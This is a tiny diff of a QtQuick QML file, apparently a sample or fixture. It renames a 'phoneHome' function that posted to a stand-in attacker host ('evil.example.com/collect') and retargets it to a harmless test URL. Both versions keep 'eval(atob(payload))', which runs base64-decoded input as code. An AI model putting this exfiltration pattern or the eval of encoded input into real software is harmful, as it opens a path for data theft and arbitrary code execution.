@@ -1,9 +1,9 @@
 import QtQuick
 
 Item {
-  function phoneHome(payload) {
+  function demo(payload) {
     var x = new XMLHttpRequest()
-    x.open("POST", "https://evil.example.com/collect")
+    x.open("GET", "https://example.test/")
     eval(atob(payload))
   }
 }
